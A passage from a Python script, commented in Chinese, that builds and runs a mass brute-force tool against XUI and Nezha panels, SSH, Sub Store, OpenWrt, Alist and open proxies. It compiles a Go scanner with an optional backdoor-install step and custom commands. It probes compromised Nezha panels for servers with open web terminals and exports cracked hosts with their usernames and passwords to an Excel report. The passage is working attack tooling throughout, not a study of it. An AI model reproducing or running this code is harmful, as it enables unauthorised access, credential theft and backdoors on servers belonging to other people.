    "		go worker(tasks, outFile, &wg)",
    "	}",
    "	scanner := bufio.NewScanner(batch)",
    "	for scanner.Scan() {",
    "		line := strings.TrimSpace(scanner.Text())",
    "		if line != \"\" { tasks <- strings.Fields(line)[0] }",
    "	}",
    "	close(tasks)",
    "	wg.Wait()",
    "}",
    "// createHttpClient 创建一个定制的HTTP客户端",
    "func createHttpClient() *http.Client {",
    "	tr := &http.Transport{ Proxy: http.ProxyFromEnvironment, DialContext: (&net.Dialer{ Timeout: {timeout} * time.Second, KeepAlive: 0 }).DialContext, TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, TLSHandshakeTimeout: {timeout} * time.Second, ResponseHeaderTimeout: {timeout} * time.Second, ExpectContinueTimeout: 1 * time.Second, ForceAttemptHTTP2: false, DisableKeepAlives: true }",
    "	return &http.Client{ Transport: tr, Timeout: ({timeout} + 1) * time.Second }",
    "}",
    "func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup) {",
    "	defer wg.Done()",
    "	httpClient := createHttpClient()",
    "	for ipPort := range tasks {",
    "		processIP(ipPort, file, httpClient)",
    "	}",
    "}",
]

# =========================== ipcx.py 内容 (增加tqdm风格进度条和批量查询) ===========================
IPCX_PY_CONTENT = r"""import requests
import time
import os
import re
import sys
import json
from openpyxl import Workbook, load_workbook
from openpyxl.utils import get_column_letter
from tqdm import tqdm

def adjust_column_width(ws):
    for col in ws.columns:
        max_length = 0
        column = col[0].column
        column_letter = get_column_letter(column)
        for cell in col:
            try:
                if cell.value:
                    length = len(str(cell.value))
                    if length > max_length:
                        max_length = length
            except:
                pass
        adjusted_width = max_length + 2
        ws.column_dimensions[column_letter].width = adjusted_width

def extract_ip_port(url):
    match = re.search(r'(\w+://)?([^@/]+@)?([^:/]+:\d+)', url)
    if match: return match.group(3)
    match = re.search(r'([^:/\s]+:\d+)', url)
    if match: return match.group(1)
    match = re.search(r'(\w+://)?([^@/]+@)?([^:/\s]+)', url)
    if match: return match.group(3)
    return url.split()[0]

def get_ip_info_batch(ip_list, retries=3):
    url = "http://ip-api.com/batch?fields=country,regionName,city,isp,query,status"
    results = {}
    payload = [{"query": ip_port.split(':')[0]} for ip_port in ip_list]
    for attempt in range(retries):
        try:
            response = requests.post(url, json=payload, timeout=20)
            response.raise_for_status()
            data = response.json()
            for item in data:
                original_ip_port = next((ip for ip in ip_list if ip.startswith(item.get('query', ''))), None)
                if original_ip_port:
                    if item.get('status') == 'success':
                        results[original_ip_port] = [original_ip_port, item.get('country', 'N/A'), item.get('regionName', 'N/A'), item.get('city', 'N/A'), item.get('isp', 'N/A')]
                    else:
                         results[original_ip_port] = [original_ip_port, '查询失败', '查询失败', '查询失败', '查询失败']
            for ip_port in ip_list:
                if ip_port not in results:
                    results[ip_port] = [ip_port, 'N/A', 'N/A', 'N/A', 'N/A']
            return [results[ip_port] for ip_port in ip_list]
        except requests.exceptions.RequestException as e:
            if attempt < retries - 1:
                time.sleep(2)
            else:
                return [[ip_port, '超时/错误', '超时/错误', '超时/错误', '超时/错误'] for ip_port in ip_list]
    return [[ip_port, 'N/A', 'N/A', 'N/A', 'N/A'] for ip_port in ip_list]

def process_ip_port_file(input_file, output_excel):
    with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
        lines = [line.strip() for line in f if line.strip()]
    headers = ['原始地址', 'IP/域名:端口', '用户名', '密码', '国家', '地区', '城市', 'ISP']
    if os.path.exists(output_excel):
        try:
            os.remove(output_excel)
        except OSError as e:
            print(f"无法删除旧的Excel文件 '{output_excel}': {e}。请手动关闭它。")
            return
    wb = Workbook()
    ws = wb.active
    ws.title = "IP信息"
    ws.append(headers)
    wb.save(output_excel)
    targets = []
    for line in lines:
        addr, user, passwd = line, '', ''
        try:
            proxy_match = re.match(r'(\w+://)(?:([^:]+):([^@]+)@)?(.+)', line)
            if proxy_match:
                user = proxy_match.group(2) or ''
                passwd = proxy_match.group(3) or ''
                addr = f"{proxy_match.group(1)}{proxy_match.group(4)}"
            else:
                parts = line.split()
                if len(parts) >= 3: addr, user, passwd = parts[0], parts[1], parts[2]
                elif len(parts) == 2: addr, user = parts[0], parts[1]
                else: addr = parts[0]
        except Exception:
             addr = line.split()[0] if line.split() else ''
        ip_port = extract_ip_port(addr)
        if ip_port:
            targets.append({'line': line, 'ip_port': ip_port, 'user': user, 'passwd': passwd})
    chunk_size = 100
    with tqdm(total=len(targets), desc="[📊] IP信息查询", unit="ip", ncols=100) as pbar:
        for i in range(0, len(targets), chunk_size):
            chunk = targets[i:i+chunk_size]
            ip_ports_in_chunk = [target['ip_port'] for target in chunk]
            batch_results = get_ip_info_batch(ip_ports_in_chunk)
            wb = load_workbook(output_excel)
            ws = wb.active
            for original_target, result_data in zip(chunk, batch_results):
                row = [original_target['line'], result_data[0], original_target['user'], original_target['passwd']] + result_data[1:]
                ws.append(row)
            wb.save(output_excel)
            pbar.update(len(chunk))
            if i + chunk_size < len(targets):
                time.sleep(4.5)
    wb = load_workbook(output_excel)
    ws = wb.active
    adjust_column_width(ws)
    wb.save(output_excel)
    print("\n✅ IP信息查询完成！")

if __name__ == "__main__":
    if len(sys.argv) > 2:
        process_ip_port_file(sys.argv[1], sys.argv[2])
    else:
        print("Usage: python ipcx.py <input_file> <output_file>")
"""

def generate_ipcx_py():
    with open('ipcx.py', 'w', encoding='utf-8') as f:
        f.write(IPCX_PY_CONTENT)

# =========================== 新增哪吒面板分析函数 ===========================
def debug_log(message, level="INFO"):
    colors = {"INFO": "\033[94m", "SUCCESS": "\033[92m", "WARNING": "\033[93m", "ERROR": "\033[91m", "ENDC": "\033[0m"}
    print(f"[{level}] {colors.get(level, '')}{message}{colors['ENDC']}")

def check_server_terminal_status(session, base_url, server_id):
    try:
        terminal_paths = [f"/dashboard/terminal/{server_id}", f"/dashboard/ssh/{server_id}", f"/dashboard/console/{server_id}", f"/dashboard/shell/{server_id}", f"/terminal/{server_id}", f"/ssh/{server_id}", f"/console/{server_id}", f"/shell/{server_id}"]
        for path in terminal_paths:
            try:
                res = session.get(base_url + path, timeout=5, verify=False)
                if res.status_code == 200:
                    content = res.text.lower()
                    has_xterm = "xterm" in content
                    has_errors = any(error in content for error in ["not found", "404", "error", "failed", "unavailable", "未找到", "错误", "失败", "不可用", "服务器不存在", "尚未连接", "terminal not available"])
                    if has_xterm and not has_errors:
                        return True
            except Exception: continue
        try:
            res = session.get(base_url + "/dashboard", timeout=5, verify=False)
            if res.status_code == 200:
                content = res.text.lower()
                if "xterm" in content and any(term in content for term in ["terminal", "ssh", "console", "shell"]):
                    return True
        except Exception: pass
    except Exception: return False
    return False

def count_terminal_accessible_servers(session, base_url):
    try:
        res = session.get(base_url + "/api/v1/server", timeout=TIMEOUT, verify=False)
        if res.status_code != 200: return 0, []
        data = res.json()
        servers = []
        if isinstance(data, dict) and "error" in data and "unauthorized" in data.get("error", "").lower():
            return check_terminal_status_via_pages(session, base_url)
        if isinstance(data, list): servers = data
        elif isinstance(data, dict) and "data" in data: servers = data["data"]
        if not servers: return 0, []
        count = 0
        accessible_servers = []
        for server in servers:
            if isinstance(server, dict) and "id" in server:
                server_id = server["id"]
                server_name = server.get("name", f"Server-{server_id}")
                if check_server_terminal_status(session, base_url, server_id):
                    count += 1
                    accessible_servers.append({"id": server_id, "name": server_name, "status": "终端畅通"})
        return count, accessible_servers
    except Exception: return 0, []

def check_terminal_status_via_pages(session, base_url):
    try:
        res = session.get(base_url + "/dashboard", timeout=TIMEOUT, verify=False)
        if res.status_code == 200:
            content = res.text.lower()
            if "xterm" in content and any(term in content for term in ["terminal", "ssh", "console", "shell"]):
                return 1, [{"id": "unknown", "name": "Dashboard", "status": "终端畅通"}]
        return 0, []
    except Exception: return 0, []

def check_for_agents_and_terminal(session, base_url):
    total_servers = 0
    try:
        res = session.get(base_url + "/api/v1/server", timeout=TIMEOUT, verify=False)
        if res.status_code == 200:
            data = res.json()
            if isinstance(data, list): total_servers = len(data)
            elif isinstance(data, dict) and "data" in data and isinstance(data["data"], list): total_servers = len(data["data"])
    except Exception: pass
    has_agents = total_servers > 0
    if not has_agents: return False, 0, 0, []
    terminal_accessible_count, terminal_accessible_servers = count_terminal_accessible_servers(session, base_url)
    return has_agents, terminal_accessible_count, total_servers, terminal_accessible_servers

def analyze_panel(result_line):
    parts = result_line.split()
    if len(parts) < 3: return result_line, (0, 0, "格式错误")
    ip_port, username, password = parts[0], parts[1], parts[2]
    for protocol in ["http", "https"]:
        base_url = f"{protocol}://{ip_port}"
        session = requests.Session()
        login_url = base_url + "/api/v1/login"
        payload = {"username": username, "password": password}
        try:
            requests.packages.urllib3.disable_warnings()
            res = session.post(login_url, json=payload, timeout=TIMEOUT, verify=False)
            if res.status_code == 200:
                try:
                    j = res.json()
                    is_login_success = False
                    auth_token = None
                    if "token" in j.get("data", {}):
                        auth_token = j["data"]["token"]
                        is_login_success = True
                    if "nz-jwt" in res.headers.get("Set-Cookie", ""): is_login_success = True
                    if j.get("code") == 200 and j.get("message", "").lower() == "success": is_login_success = True
                    if is_login_success:
                        if auth_token: session.headers.update({"Authorization": f"Bearer {auth_token}"})
                        _, term_count, machine_count, term_servers = check_for_agents_and_terminal(session, base_url)
                        server_names = [s.get('name', s.get('id', '')) for s in term_servers]
                        servers_string = ", ".join(map(str, server_names)) if server_names else "无"
                        return result_line, (machine_count, term_count, servers_string)
                except json.JSONDecodeError:
                    if "oauth2" in res.text.lower(): return result_line, (0, 0, "登录页面")
                    return result_line, (0, 0, "分析失败")
                except Exception as e:
                    debug_log(f"分析时出错 {base_url}: {e}", "ERROR")
                    return result_line, (0, 0, "分析失败")
        except requests.exceptions.RequestException: continue
    return result_line, (0, 0, "登录失败")

# =========================== 主脚本优化部分 ===========================
GO_EXEC = "/usr/local/go/bin/go"

def update_excel_with_nezha_analysis(xlsx_file, analysis_data):
    if not os.path.exists(xlsx_file):
        print(f"⚠️ Excel文件 {xlsx_file} 不存在，跳过更新。")
        return
    try:
        wb = load_workbook(xlsx_file)
        ws = wb.active
        server_count_col, terminal_count_col, terminal_list_col = ws.max_column + 1, ws.max_column + 2, ws.max_column + 3
        ws.cell(row=1, column=server_count_col, value="服务器总数")
        ws.cell(row=1, column=terminal_count_col, value="终端畅通数")
        ws.cell(row=1, column=terminal_list_col, value="畅通服务器列表")
        for row_idx in range(2, ws.max_row + 1):
            original_address = ws.cell(row=row_idx, column=1).value
            if original_address in analysis_data:
                analysis_result = analysis_data[original_address]
                if len(analysis_result) == 3:
                    machine_count, term_count, servers_string = analysis_result
                    ws.cell(row=row_idx, column=server_count_col, value=machine_count)
                    ws.cell(row=row_idx, column=terminal_count_col, value=term_count)
                    ws.cell(row=row_idx, column=terminal_list_col, value=servers_string)
        wb.save(xlsx_file)
        print("✅ 成功将哪吒面板分析结果写入Excel报告。")
    except Exception as e:
        print(f"❌ 更新Excel文件时发生错误: {e}")

def input_with_default(prompt, default):
    user_input = input(f"{prompt}（默认 {default}）：").strip()
    return int(user_input) if user_input.isdigit() else default

def input_filename_with_default(prompt, default):
    user_input = input(f"{prompt}（默认 {default}）：").strip()
    return user_input if user_input else default

def escape_go_string(s: str) -> str:
    return s.replace("\\", "\\\\").replace('"', '\\"')

def generate_go_code(template_lines, semaphore_size, usernames, passwords, timeout, **kwargs):
    user_list = "[]string{" + ", ".join([f'"{escape_go_string(u)}"' for u in usernames]) + "}"
    pass_list = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in passwords]) + "}"
    code = "\n".join(template_lines)
    code = code.replace("{semaphore_size}", str(semaphore_size)).replace("{user_list}", user_list).replace("{pass_list}", pass_list).replace("{timeout}", str(timeout))
    if 'install_backdoor' in kwargs:
        backdoor_flag = "true" if kwargs['install_backdoor'] else "false"
        cmd_array = "[]string{" + ", ".join([f'"{escape_go_string(line)}"' for line in kwargs.get('custom_cmds', [])]) + "}"
        code = code.replace("{enable_backdoor}", backdoor_flag).replace("{custom_backdoor_cmds}", cmd_array)
    if 'proxy_type' in kwargs:
        creds_list = "[]string{" + ", ".join([f'"{escape_go_string(line)}"' for line in kwargs.get('credentials', [])]) + "}"
        code = code.replace("{proxy_type}", kwargs['proxy_type']).replace("{auth_mode}", str(kwargs.get('auth_mode', 0))).replace("{creds_list}", creds_list)
        if 'test_url' in kwargs:
            escaped_url = escape_go_string(kwargs['test_url'])
            code = code.replace("testURL      = \"http://myip.ipip.net\"", f"testURL      = \"{escaped_url}\"")
    with open('xui.go', 'w', encoding='utf-8', errors='ignore') as f:
        f.write(code)

def compile_go_program():
    executable_name = "xui_executable"
    if sys.platform == "win32": executable_name += ".exe"
    print("--- ⚙️ 正在编译Go程序... ---")
    go_env = os.environ.copy()
    if 'HOME' not in go_env: go_env['HOME'] = '/tmp'
    if 'GOCACHE' not in go_env: go_env['GOCACHE'] = '/tmp/.cache/go-build'
    try:
        process = subprocess.Popen([GO_EXEC, 'build', '-ldflags', '-s -w', '-o', executable_name, 'xui.go'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=go_env)
        stdout, stderr = process.communicate()
        stdout, stderr = stdout.decode('utf-8', 'ignore'), stderr.decode('utf-8', 'ignore')
        if process.returncode != 0:
            raise subprocess.CalledProcessError(process.returncode, [GO_EXEC, 'build', '-o', executable_name, 'xui.go'], stdout, stderr)
        if stderr: print(f"--- Go编译器警告 ---\n{stderr}")
        print(f"--- ✅ Go程序编译成功: {executable_name} ---")
        return executable_name
    except subprocess.CalledProcessError as e:
        print(f"--- ❌ Go 程序编译失败 ---\n返回码: {e.returncode}\n--- 标准输出 ---\n{e.stdout}\n--- 错误输出 ---\n{e.stderr}\n--------------------------\n编译失败，请检查Go环境和代码。")
        sys.exit(1)

def adjust_oom_score():
    if sys.platform != "linux": return
    try:
        pid = os.getpid()
        oom_score_adj_path = f"/proc/{pid}/oom_score_adj"
        if os.path.exists(oom_score_adj_path):
            with open(oom_score_adj_path, "w") as f: f.write("-500")
            print("✅ 成功调整OOM Score，降低被系统杀死的概率。")
    except PermissionError: print("⚠️  调整OOM Score失败：权限不足。建议使用root用户运行以获得最佳稳定性。")
    except Exception as e: print(f"⚠️  调整OOM Score时发生未知错误: {e}")

def check_and_manage_swap():
    if sys.platform != "linux": return
    try:
        swap_info = psutil.swap_memory()
        if swap_info.total > 0:
            print(f"✅ 检测到已存在的Swap空间，大小: {swap_info.total / 1024 / 1024:.2f} MiB。")
            return
        print("⚠️  警告：未检测到活动的Swap交换空间。在高负载下，这会极大地增加进程被系统杀死的风险。")
        choice = input("❓ 是否要创建一个2GB的临时Swap文件来提高稳定性？(y/N): ").strip().lower()
        if choice == 'y':
            swap_file = "/tmp/autoswap.img"
            print(f"--- 正在创建2GB Swap文件: {swap_file} (可能需要一些时间)... ---")
            if shutil.which("fallocate"): subprocess.run(["fallocate", "-l", "2G", swap_file], check=True)
            else: subprocess.run(["dd", "if=/dev/zero", f"of={swap_file}", "bs=1M", "count=2048"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["chmod", "600", swap_file], check=True)
            subprocess.run(["mkswap", swap_file], check=True)
            subprocess.run(["swapon", swap_file], check=True)
            atexit.register(cleanup_swap, swap_file)
            print(f"✅ 成功创建并启用了2GB Swap文件: {swap_file}")
            print("   该文件将在脚本退出时自动被禁用和删除。")
    except Exception as e: print(f"❌ Swap文件管理失败: {e}\n   请检查权限或手动创建Swap。脚本将继续运行，但稳定性可能受影响。")

def cleanup_swap(swap_file):
    print(f"\n--- 正在禁用和清理临时Swap文件: {swap_file} ---")
    try:
        subprocess.run(["swapoff", swap_file], check=False)
        os.remove(swap_file)
        print("✅ 临时Swap文件已成功清理。")
    except Exception as e: print(f"⚠️ 清理Swap文件失败: {e}")

# ==================== 全新执行模型 ====================
def process_chunk(chunk_id, lines, executable_name, go_internal_concurrency):
    input_file, output_file = os.path.join(TEMP_PART_DIR, f"input_{chunk_id}.txt"), os.path.join(TEMP_XUI_DIR, f"output_{chunk_id}.txt")
    with open(input_file, 'w', encoding='utf-8') as f: f.write("\n".join(lines))
    try:
        run_env = os.environ.copy()
        total_memory = psutil.virtual_memory().total
        mem_limit = int(total_memory * 0.70 / 1024 / 1024)
        run_env["GOMEMLIMIT"], run_env["GOGC"] = f"{mem_limit}MiB", "50"
        cmd = ['./' + executable_name, input_file, output_file]
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, env=run_env)
        for line_bytes in iter(process.stdout.readline, b''):
            line = line_bytes.decode('utf-8', 'ignore')
            if "Scanning SSH:" in line: print(line.strip().ljust(80), end='\r')
        process.wait()
        if process.returncode != 0:
            if process.returncode == -9 or process.returncode == 137: return (False, f"任务 {chunk_id} 被系统因内存不足而终止(OOM Killed)。")
            else:
                stderr_output = process.stdout.read().decode('utf-8', 'ignore')
                return (False, f"任务 {chunk_id} 失败，返回码 {process.returncode}。\n错误信息:\n{stderr_output}")
        return (True, None)
    finally:
        if os.path.exists(input_file): os.remove(input_file)

def run_scan_in_parallel(lines, executable_name, python_concurrency, go_internal_concurrency, chunk_size):
    chunks = [lines[i:i + chunk_size] for i in range(0, len(lines), chunk_size)]
    print(f"--- 🚀 已将 {len(lines)} 个目标分为 {len(chunks)} 个小任务块 ---")
    with ThreadPoolExecutor(max_workers=python_concurrency) as executor:
        future_to_chunk_id = {executor.submit(process_chunk, i, chunk, executable_name, go_internal_concurrency): i for i, chunk in enumerate(chunks)}
        with tqdm(total=len(chunks), desc="[🎯] 处理任务块") as pbar:
            for future in as_completed(future_to_chunk_id):
                chunk_id = future_to_chunk_id[future]
                try:
                    success, error_message = future.result()
                    if not success:
                        print(" " * 80, end='\r')
                        print(f"\n❌ {error_message}")
                        if "OOM" in error_message:
                            print("检测到OOM错误，正在中止所有任务...")
                            executor.shutdown(wait=False, cancel_futures=True)
                            raise SystemExit("内存不足，脚本已中止。请使用更低的并发数重试。")
                except Exception as exc: print(f'\n任务 {chunk_id} 执行时产生异常: {exc}')
                pbar.update(1)
    print("\n")

# =======================================================

def merge_xui_files():
    merged_file = 'xui.txt' 
    if os.path.exists(merged_file): os.remove(merged_file)
    with open(merged_file, 'w', encoding='utf-8') as outfile:
        for f in sorted(os.listdir(TEMP_XUI_DIR)):
            if f.startswith("output_") and f.endswith(".txt"):
                with open(os.path.join(TEMP_XUI_DIR, f), 'r', encoding='utf-8') as infile:
                    shutil.copyfileobj(infile, outfile)

def merge_result_files(prefix: str, output_name: str, target_dir: str):
    output_path = output_name 
    if os.path.exists(output_path): os.remove(output_path)
    files_to_merge = [os.path.join(target_dir, name) for name in sorted(os.listdir(target_dir)) if name.startswith(prefix) and name.endswith(".txt")]
    if not files_to_merge: return
    with open(output_path, "w", encoding="utf-8") as out:
        for f_path in files_to_merge:
            with open(f_path, "r", encoding="utf-8") as f:
                shutil.copyfileobj(f, out)

def run_ipcx(final_result_file, xlsx_output_file):
    if os.path.exists(final_result_file) and os.path.getsize(final_result_file) > 0:
        print("\n--- 📊 正在调用 ipcx.py 查询IP地理位置并生成Excel报告... ---")
        subprocess.run([sys.executable, 'ipcx.py', final_result_file, xlsx_output_file])

def clean_temp_files(template_mode):
    shutil.rmtree(TEMP_PART_DIR, ignore_errors=True)
    shutil.rmtree(TEMP_XUI_DIR, ignore_errors=True)
    if template_mode == 6:
        shutil.rmtree(TEMP_HMSUCCESS_DIR, ignore_errors=True)
        shutil.rmtree(TEMP_HMFAIL_DIR, ignore_errors=True)
    for f in ['xui.go', 'ipcx.py', 'go.mod', 'go.sum', 'xui_executable', 'xui_executable.exe']: 
        if os.path.exists(f):
            try: os.remove(f)
            except OSError: pass

def choose_template_mode():
    print("请选择爆破模式：")
    print("1. XUI面板")
    print("2. 哪吒面板")
    print("3. SSH")
    print("4. Sub Store")
    print("5. OpenWrt/iStoreOS")
    print("--- 代理模式 ---")
    print("6. SOCKS5 代理")
    print("7. HTTP 代理")
    print("8. HTTPS 代理")
    print("--- 其他面板 ---")
    print("9. Alist 面板")
    while True:
        choice = input("输入 1-9 之间的数字（默认1）：").strip()
        if choice in ("", "1"): return 1
        elif choice == "2": return 2
        elif choice == "3": return 6
        elif choice == "4": return 7
        elif choice == "5": return 8
        elif choice == "6": return 9
        elif choice == "7": return 10
        elif choice == "8": return 11
        elif choice == "9": return 12
        else: print("❌ 输入无效，请重新输入。")

def select_proxy_test_target():
    print("\n--- 🌐 代理测试目标选择 ---")
    print("1: IPIP.net (IP验证, 推荐)")
    print("2: Google (全球, http)")
    print("3: Xiaomi (中国大陆稳定, http)")
    print("4: Baidu (中国大陆稳定, https)")
    print("5: 自定义URL")
    default_target = "http://myip.ipip.net"
    while True:
        choice_str = input("请选择一个测试目标 (默认 1): ").strip()
        if choice_str in ("", "1"): return default_target
        try:
            choice = int(choice_str)
            if choice == 2: return "http://www.google.com/generate_204"
            elif choice == 3: return "http://connect.rom.miui.com/generate_204"
            elif choice == 4: return "https://www.baidu.com"
            elif choice == 5:
                custom_url = input("请输入自定义测试URL: ").strip()
                if custom_url: return custom_url
                else: print("[!] 输入为空，使用默认目标。"); return default_target
            else: print("[!] 无效选择，请重新输入。")
        except ValueError: print("[!] 无效输入，请输入数字。")

def get_default_interface():
    try:
        result = subprocess.check_output(["ip", "route", "get", "8.8.8.8"], text=True)
        match = re.search(r'dev\s+(\S+)', result)
        if match: return match.group(1)
    except Exception:
        try:
            with open('/proc/net/route') as f:
                for line in f:
                    fields = line.strip().split()
                    if fields[1] == '00000000' and int(fields[3], 16) & 2: return fields[0]
        except Exception: return None
    return None

def check_environment(template_mode):
    import platform
    def run_cmd(cmd, check=True, quiet=False, extra_env=None):
        env = os.environ.copy()
        if extra_env: env.update(extra_env)
        stdout, stderr = (subprocess.DEVNULL, subprocess.DEVNULL) if quiet else (None, None)
        try: subprocess.run(cmd, check=check, stdout=stdout, stderr=stderr, env=env)
        except FileNotFoundError: print(f"❌ 命令未找到: {cmd[0]}。请确保该命令在您的系统PATH中。"); raise
    def is_in_china():
        print("\n    -  Detecting network environment by pinging google.com...")
        try:
            result = subprocess.run(["ping", "-c", "1", "-W", "2", "google.com"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False)
            if result.returncode == 0: print("    - ✅ Ping successful, determined to be an overseas server."); return False
            else: print("    - ⚠️ Ping timed out or failed, determined to be a domestic (China) server, will use mirror sites."); return True
        except (FileNotFoundError, Exception): print("    - ⚠️ Ping command not found or failed, will use default sources."); return False
    if platform.system().lower() == "windows":
        print(">>> 🪟 检测到 Windows 系统，跳过环境检测和依赖安装...\\n")
        return
    print(">>> 🛠️ 正在检查并安装依赖环境...")
    pkg_manager = "apt-get" if shutil.which("apt-get") else "yum" if shutil.which("yum") else ""
    if not pkg_manager: print("❌ 无法检测到 apt-get 或 yum。此脚本仅支持 Debian/Ubuntu 和 CentOS/RHEL 系列系统。"); sys.exit(1)
    print(f"    - 包管理器: {pkg_manager}")
    UPDATED = False
    def ensure_packages(pm, packages):
        nonlocal UPDATED
        sys.stdout.write(f"    - 正在使用 {pm} 检查系统包... "); sys.stdout.flush()
        try:
            if not UPDATED and pm == "apt-get": run_cmd([pm, "update", "-y"], quiet=True); UPDATED = True
            run_cmd([pm, "install", "-y"] + packages, quiet=True)
            print("✅")
        except Exception as e: print(f"❌ 失败: {e}"); sys.exit(1)
    
    ping_package = "iputils-ping" if pkg_manager == "apt-get" else "iputils"
    iproute_package = "iproute2" if pkg_manager == "apt-get" else "iproute"
    ensure_packages(pkg_manager, ["curl", ping_package, iproute_package, "nmap", "masscan", "ca-certificates", "tar"])
    
    in_china = is_in_china()
    required_py_modules = ['requests', 'psutil', 'openpyxl', 'pyyaml', 'tqdm', 'colorama']
    missing_modules = [module for module in required_py_modules if not __import__(module, fromlist=[None])]
    if missing_modules:
        print(f"    - 🐍 检测到缺失的 Python 模块: {', '.join(missing_modules)}")
        sys.stdout.write("    - 正在尝试使用 pip 自动安装... "); sys.stdout.flush()
        try:
            pip_help_output = subprocess.check_output([sys.executable, "-m", "pip", "install", "--help"], text=True, stderr=subprocess.DEVNULL)
            use_break_system_packages = "--break-system-packages" in pip_help_output
            pip_cmd = [sys.executable, "-m", "pip", "install"]
            if in_china: pip_cmd.extend(["-i", "https://pypi.tuna.tsinghua.edu.cn/simple"])
            if use_break_system_packages: pip_cmd.append("--break-system-packages")
            run_cmd(pip_cmd + missing_modules, quiet=True)
            print("✅")
        except Exception as e:
            print(f"❌ 失败: {e}")
            manual_cmd = f"{sys.executable} -m pip install {' '.join(missing_modules)}"
            if use_break_system_packages: manual_cmd += " --break-system-packages"
            if in_china: manual_cmd += " -i https://pypi.tuna.tsinghua.edu.cn/simple"
            print(f"❌ 自动安装失败。请手动运行以下命令解决依赖问题后重试:\n{manual_cmd}"); sys.exit(1)

    if pkg_manager == "apt-get": sys.stdout.write("    - 正在更新CA证书... "); sys.stdout.flush(); run_cmd(["update-ca-certificates"], quiet=True); print("✅")
    
    def get_go_version():
        if not os.path.exists(GO_EXEC): return None
        try:
            out = subprocess.check_output([GO_EXEC, "version"], stderr=subprocess.DEVNULL).decode()
            m = re.search(r"go(\d+)\.(\d+)", out)
            return (int(m.group(1)), int(m.group(2))) if m else None
        except: return None
    if not (get_go_version() and get_go_version() >= (1, 20)):
        print("--- ⚠️ Go环境不满足，正在自动安装... ---")
        if pkg_manager == "apt-get": run_cmd(["apt-get", "remove", "-y", "golang-go"], check=False, quiet=True); run_cmd(["apt-get", "autoremove", "-y"], check=False, quiet=True)
        else: run_cmd(["yum", "remove", "-y", "golang"], check=False, quiet=True)
        urls = ["https://studygolang.com/dl/golang/go1.22.1.linux-amd64.tar.gz", "https://go.dev/dl/go1.22.1.linux-amd64.tar.gz"]
        if not in_china: urls.reverse()
        GO_TAR_PATH, download_success = "/tmp/go.tar.gz", False
        for url in urls:
            print(f"    - 正在从 {url.split('/')[2]} 下载Go...")
            try: subprocess.run(["curl", "-#", "-Lo", GO_TAR_PATH, url], check=True); download_success = True; break
            except Exception: print("      下载失败，尝试下一个源...")
        if not download_success: print("❌ Go安装包下载失败，请检查网络。"); sys.exit(1)
        sys.stdout.write("    - 正在解压Go安装包... "); sys.stdout.flush()
        try: run_cmd(["rm", "-rf", "/usr/local/go"], quiet=True); run_cmd(["tar", "-C", "/usr/local", "-xzf", GO_TAR_PATH], quiet=True); print("✅")
        except Exception as e: print(f"❌ 失败: {e}"); sys.exit(1)
        os.environ["PATH"] = "/usr/local/go/bin:" + os.environ["PATH"]
    
    go_env = os.environ.copy()
    if 'HOME' not in go_env: go_env['HOME'] = '/tmp'
    if 'GOCACHE' not in go_env: go_env['GOCACHE'] = '/tmp/.cache/go-build'
    if in_china: go_env['GOPROXY'] = 'https://goproxy.cn,direct'
    if not os.path.exists("go.mod"): run_cmd([GO_EXEC, "mod", "init", "xui"], quiet=True, extra_env=go_env)
    
    required_pkgs = []
    if template_mode == 6: required_pkgs.append("golang.org/x/crypto/ssh")
    if template_mode in [9, 10, 11]: required_pkgs.append("golang.org/x/net/proxy")
    if required_pkgs:
        sys.stdout.write("    - 正在安装Go模块... "); sys.stdout.flush()
        for pkg in required_pkgs:
            try: run_cmd([GO_EXEC, "get", pkg], quiet=True, extra_env=go_env)
            except subprocess.CalledProcessError as e: print(f"\n❌ Go模块 '{pkg}' 安装失败。请检查网络或代理设置。"); raise e 
        print("✅")
    print(">>> ✅ 环境依赖检测完成\n")

def load_credentials(template_mode, auth_mode=0):
    usernames, passwords, credentials = [], [], []
    if template_mode == 7: return ["2cXaAxRGfddmGz2yx1wA"], ["2cXaAxRGfddmGz2yx1wA"], []
    if template_mode in [12]: return [], [], []
    if auth_mode == 1: return [], [], []
    if auth_mode == 2:
        if not os.path.exists("username.txt") or not os.path.exists("password.txt"): print("❌ 错误: 缺少 username.txt 或 password.txt 文件。"); sys.exit(1)
        with open("username.txt", 'r', encoding='utf-8-sig', errors='ignore') as f: usernames = [line.strip() for line in f if line.strip()]
        with open("password.txt", 'r', encoding='utf-8-sig', errors='ignore') as f: passwords = [line.strip() for line in f if line.strip()]
        if template_mode == 2:
            print("ℹ️  检测到哪吒面板模式，将自动过滤长度小于8的密码...")
            original_pass_count = len(passwords)
            passwords = [p for p in passwords if len(p) >= 8 or p == 'admin']
            print(f"  - 过滤完成，保留了 {len(passwords)}/{original_pass_count} 个密码。")
            if not passwords: print("❌ 错误: 过滤后，密码字典中没有剩余的有效密码。\n   哪吒面板要求密码至少为8个字符（默认密码'admin'除外），无法继续扫描。"); sys.exit(1)
        if not usernames or not passwords: print("❌ 错误: 用户名或密码文件为空。"); sys.exit(1)
        return usernames, passwords, credentials
    if auth_mode == 3:
        if not os.path.exists("credentials.txt"): print("❌ 错误: 缺少 credentials.txt 文件。"); sys.exit(1)
        with open("credentials.txt", 'r', encoding='utf-8-sig', errors='ignore') as f: credentials = [line.strip() for line in f if line.strip() and ":" in line]
        if not credentials: print("❌ 错误: credentials.txt 文件为空或格式不正确。"); sys.exit(1)
        return usernames, passwords, credentials
    use_custom = input("是否使用 username.txt / password.txt 字典库？(y/N，使用内置默认值): ").strip().lower()
    if use_custom == 'y': return load_credentials(template_mode, auth_mode=2)
    else:
        if template_mode == 8: return ["root"], ["password"], []
        else: return ["admin"], ["admin"], []

def get_vps_info():
    try:
        response = requests.get("http://ip-api.com/json/?fields=country,query", timeout=10)
        response.raise_for_status()
        data = response.json()
        return data.get('query', 'N/A'), data.get('country', 'N/A')
    except requests.exceptions.RequestException as e: print(f"⚠️ 获取VPS信息失败: {e}"); return "N/A", "N/A"

def get_nezha_server(config_file="config.yml"):
    if not os.path.exists(config_file): return "N/A"
    try:
        import yaml
        with open(config_file, 'r', encoding='utf-8') as f:
            config_data = yaml.safe_load(f)
